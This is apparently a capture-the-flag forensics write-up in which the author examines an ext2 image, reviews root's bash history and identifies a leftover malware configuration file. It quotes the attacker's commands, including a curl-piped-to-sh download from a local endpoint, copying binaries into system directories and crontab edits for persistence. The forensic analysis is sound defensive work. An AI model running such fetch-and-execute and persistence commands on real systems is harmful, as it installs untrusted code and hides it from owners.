# Task 1 - Getting Started - (Forensics)
### Date started: September 24, 2025
### Date completed: September 24, 2025
### Provided Materials
- Zipped EXT2 image (image.ext2.zip)
### Objective
Analyze the ext2 image to identify a suspicious artifact and submit the SHA-1 hash of that artifact.
### Analysis
I began by mounting the ext2 image in a Linux environment and surveying the filesystem structure. The image presented a standard Linux filesystem layout with many files left intact, indicating that the solution would require targeted analysis rather than brute-force file hashing of all contents.

To determine how the system had been used, user accounts were enumerated by examining `/etc/passwd`. The only account capable of logging in was `root`, so I focused on root-owned artifacts. Within `/root`, a `.bash_history` file containing multiple command entries was identified.

Reviewing the `.bash_history` revealed a large number of repetitive commands consistent with routine system maintenance activities, such as application availability checks and backups to an external drive. However, one sequence of commands stood out. The history showed a `curl` request to a locally hosted endpoint, followed by an archive being downloaded and executed from `/tmp`:
```bash
cd /tmp
curl http://127.0.0.1:10000/a/get.sh | sh
```

Subsequent commands revealed that files from the downloaded archive were extracted and copied into system directories, including `/etc/runlevels/nonetwork` and `/bin/console`. The command history also indicated that the system crontab was modified to execute these files on a schedule:
```bash
tar xf t.tar
cp c /etc/runlevels/nonetwork/saozwxecnm
cp a /bin/console
cp b /etc/runlevels/default/console
rm -f a
ls
rm -f ./b ./c
ls
/bin/console -s
ps
chmod +x /bin/console
/bin/console -s
ps | grep con
kill 1020
/bin/console -s -o /etc/runlevels/nonetwork/saozwxecnm
ps
exit
last -20
w
crontab -l
crontab -e
crontab -l
```

Although the modified crontab itself was not present in the image, the command history strongly suggested persistence mechanisms had been established. This behavior is consistent with attempts to establish persistence across system reboots. The file `/bin/console` appears to be an executable that takes another file (`/etc/runlevels/nonetwork/saozwxecnm`) as a configuration or parameter input.

Later entries in the `.bash_history` showed attempts to remove the downloaded files using `rm -f`:
```bash
rm -f etc/runlevels/nonetwork/saozwxecnm
rm -f /bin/console
rm -f /etc/runlevels/default/console
```

Due to a typo in one of the removal commands, the file `/etc/runlevels/nonetwork/saozwxecnm` was not deleted and remained accessible within the image. Examination of this file showed that it contained configuration values passed to `/bin/console`, including a custom endpoint path:
```
U=/a/eca5d2ce6676f376ca2f8e639e58a2a2/xxyz
P=20
A=/app/www
```
### Result
The remaining file `/etc/runlevels/nonetwork/saozwxecnm` was identified as the suspicious artifact. Its SHA-1 hash was calculated and submitted as the solution for Task 1.